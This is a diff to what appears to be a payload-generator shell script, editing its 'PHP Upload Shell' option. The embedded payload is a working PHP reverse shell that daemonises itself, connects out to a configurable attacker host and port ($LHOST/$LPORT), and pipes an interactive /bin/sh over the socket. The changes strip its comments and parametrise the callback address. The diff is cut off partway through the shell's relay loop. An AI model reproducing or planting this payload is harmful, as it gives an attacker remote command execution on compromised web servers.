@@ -164,14 +164,11 @@ case $choice in
         ;;
     u) # PHP Upload Shell
         payload="<?php
-
-
-
-
+		
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '$LHOST';  
+$port = $LPORT;      
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -179,14 +176,9 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-//
-// Daemonise ourself if possible to avoid zombies later
-//
 
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
+
 if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
 	$pid = pcntl_fork();
 	
 	if ($pid == -1) {
@@ -198,8 +190,7 @@ if (function_exists('pcntl_fork')) {
 		exit(0);  // Parent exits
 	}
 
-	// Make the current process a session leader
-	// Will only succeed if we forked
+	
 	if (posix_setsid() == -1) {
 		printit("Error: Can't setsid()");
 		exit(1);
@@ -210,15 +201,13 @@ if (function_exists('pcntl_fork')) {
 	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
 }
 
-// Change to a safe directory
+
 chdir("/");
 
-// Remove any umask we inherited
+
 umask(0);
 
-//
-// Do the reverse shell...
-//
+
 
 // Open reverse connection
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
@@ -241,8 +230,7 @@ if (!is_resource($process)) {
 	exit(1);
 }
 
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
+
 stream_set_blocking($pipes[0], 0);
 stream_set_blocking($pipes[1], 0);
 stream_set_blocking($pipes[2], 0);
@@ -263,12 +251,11 @@ while (1) {
 		break;
 	}
 
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
+	
 	$read_a = array($sock, $pipes[1], $pipes[2]);
 	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
-	// If we can read from the TCP socket, send
+	
 	// data to process's STDIN
 	if (in_array($sock, $read_a)) {
 		if ($debug) printit("SOCK READ");
